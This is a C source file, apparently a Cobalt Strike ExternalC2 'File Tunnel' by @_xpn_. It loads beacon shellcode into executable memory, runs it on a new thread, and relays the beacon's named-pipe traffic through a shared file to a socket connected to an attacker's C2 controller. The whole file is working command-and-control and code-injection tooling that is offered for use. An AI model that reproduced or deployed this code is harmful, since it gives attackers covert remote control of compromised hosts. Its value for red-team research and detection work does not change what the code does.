#include "stdafx.h"

// Allocates a RWX page for the CS beacon, copies the payload, and starts a new thread
void spawnBeacon(char *payload, DWORD len) {

	HANDLE threadHandle;
	DWORD threadId = 0;
	char *alloc = (char *)VirtualAlloc(NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(alloc, payload, len);

	threadHandle = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)alloc, NULL, 0, &threadId);
}

// Sends data to our C2 controller received from our injected beacon
void sendData(SOCKET sd, const char *data, DWORD len) {
	char *buffer = (char *)malloc(len + 4);
  if (buffer == NULL)
      return;
      
	DWORD bytesWritten = 0, totalLen = 0;

	*(DWORD *)buffer = len;
	memcpy(buffer + 4, data, len);

	while (totalLen < len + 4) {
		bytesWritten = send(sd, buffer + totalLen, len + 4 - totalLen, 0);
		totalLen += bytesWritten;
	}
	free(buffer);
}

// Receives data from our C2 controller to be relayed to the injected beacon
char *recvData(SOCKET sd, DWORD *len) {
	char *buffer;
	DWORD bytesReceived = 0, totalLen = 0;

	*len = 0;

	recv(sd, (char *)len, 4, 0);
	buffer = (char *)malloc(*len);
  if (buffer == NULL)
      return NULL;

	while (totalLen < *len) {
		bytesReceived = recv(sd, buffer + totalLen, *len - totalLen, 0);
		totalLen += bytesReceived;
	}
	return buffer;
}

// Creates a new C2 controller connection for relaying commands
SOCKET createC2Socket(const char *addr, WORD port) {
	WSADATA wsd;
	SOCKET sd;
	SOCKADDR_IN sin;
	WSAStartup(0x0202, &wsd);

	memset(&sin, 0, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);
	sin.sin_addr.S_un.S_addr = inet_addr(addr);

	sd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
	connect(sd, (SOCKADDR*)&sin, sizeof(sin));

	return sd;
}

// Connects to the name pipe spawned by the injected beacon
HANDLE connectBeaconPipe(const char *pipeName) {
	HANDLE beaconPipe;

	beaconPipe = CreateFileA(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, NULL, NULL);

	return beaconPipe;
}

// Receives data from our injected beacon via a named pipe
char *recvFromBeacon(HANDLE pipe, DWORD *len) {
	char *buffer;
	DWORD bytesRead = 0, totalLen = 0;

	*len = 0;

	ReadFile(pipe, len, 4, &bytesRead, NULL);
	buffer = (char *)malloc(*len);
  if (buffer == NULL)
      return NULL;

	while (totalLen < *len) {
		ReadFile(pipe, buffer + totalLen, *len - totalLen, &bytesRead, NULL);
		totalLen += bytesRead;
	}
	return buffer;
}

// Write data to our injected beacon via a named pipe
void sendToBeacon(HANDLE pipe, const char *data, DWORD len) {
	DWORD bytesWritten = 0;
	WriteFile(pipe, &len, 4, &bytesWritten, NULL);
	WriteFile(pipe, data, len, &bytesWritten, NULL);
}

HANDLE openC2FileServer(const char *filepath) {
	HANDLE handle;

	handle = CreateFileA(filepath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (handle == INVALID_HANDLE_VALUE)
		printf("Error opening file: %x\n", GetLastError());
	return handle;
}

DWORD seq = 0;

HANDLE openC2FileClient(const char *filepath) {
	HANDLE handle;

	handle = CreateFileA(filepath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (handle == INVALID_HANDLE_VALUE)
		printf("Error opening file: %x\n", GetLastError());
	return handle;
}

void writeC2File(HANDLE c2File, const char *data, DWORD len, int id) {
	char *fileBytes;
	DWORD bytesWritten = 0;
	
	fileBytes = (char *)malloc(8 + len);
  if (fileBytes == NULL)
      return;

	*(DWORD *)fileBytes = id;
	*(DWORD *)(fileBytes+4) = len;
	memcpy(fileBytes + 8, data, len);
	SetFilePointer(c2File, 0, 0, FILE_BEGIN);
	WriteFile(c2File, fileBytes, 8 + len, &bytesWritten, NULL);
	printf("[*] Wrote %d bytes\n", bytesWritten);
}

char *readC2File(HANDLE c2File, DWORD *len, int expect) {
	char header[8];
	DWORD bytesRead = 0;
	char *fileBytes;

	memset(header, 0xFF, sizeof(header));

	while (*(DWORD *)header != expect) {
		SetFilePointer(c2File, 0, 0, FILE_BEGIN);
		ReadFile(c2File, header, 8, &bytesRead, NULL);
		Sleep(100);
	}

	*len = *(DWORD *)(header + 4);
	fileBytes = (char *)malloc(*len);
  if (fileBytes == NULL)
      return NULL;
      
	ReadFile(c2File, fileBytes, *len, &bytesRead, NULL);
	printf("[*] Read %d bytes\n", bytesRead);
	return fileBytes;
}

void startServer(const char *filepath, const char *ip, int port) {
	char *payloadData = NULL;
	DWORD payloadLen = 0;
	HANDLE c2FileHandle;

	seq = 0;

	c2FileHandle = openC2FileServer(filepath);

	// Create a connection back to our C2 controller
	SOCKET c2socket = createC2Socket(ip, port);
	payloadData = recvData(c2socket, &payloadLen);

	while (true) {
		writeC2File(c2FileHandle, payloadData, payloadLen, 1);
		payloadData = readC2File(c2FileHandle, &payloadLen, 2);
		sendData(c2socket, payloadData, payloadLen);
		payloadData = recvData(c2socket, &payloadLen);
	}
}

void startClient(const char *filepath) {
	char *payloadData = NULL;
	DWORD payloadLen = 0;
	HANDLE c2FileHandle;
	HANDLE beaconPipe = INVALID_HANDLE_VALUE;

	seq = 1;

	c2FileHandle = openC2FileClient(filepath);

	payloadData = readC2File(c2FileHandle, &payloadLen, 1);
	spawnBeacon(payloadData, payloadLen);

	printf("[*] Injecting SMB beacon\n");
	// Loop until the pipe is up and ready to use
	while (beaconPipe == INVALID_HANDLE_VALUE) {
		// Create our IPC pipe for talking to the C2 beacon
		Sleep(500);
		beaconPipe = connectBeaconPipe("\\\\.\\pipe\\xpntest");
	}
	printf("[*] Connected to SMB beacon named pipe\n");

	while (true) {
		// Start the pipe dance
		payloadData = recvFromBeacon(beaconPipe, &payloadLen);
		if (payloadLen == 0) break;

		writeC2File(c2FileHandle, payloadData, payloadLen, 2);

		payloadData = readC2File(c2FileHandle, &payloadLen, 1);
		if (payloadLen == 0) break;

		sendToBeacon(beaconPipe, payloadData, payloadLen);
		free(payloadData);
	}

}

#define ARG_COUNT 5

int main(int argc, char **argv)
{
	printf("Cobalt Strike ExternalC2 -  File Tunnel\n");
	printf("@_xpn_\n\n");

	if (argc != ARG_COUNT) {
		printf("Usage: %s [C|S] [FILEPATH] ([C2_IP] [C2_PORT])\n");
		return 1;
	}

	if (argv[1][0] == 'C' || argv[1][0] == 'c') {
		printf("[!] Starting client side\n\n");
		startClient(argv[2]);
	}
	else {
		printf("[!] Starting server side\n\n");
		startServer(argv[2], argv[3], atoi(argv[4]));
	}

	return 0;
}

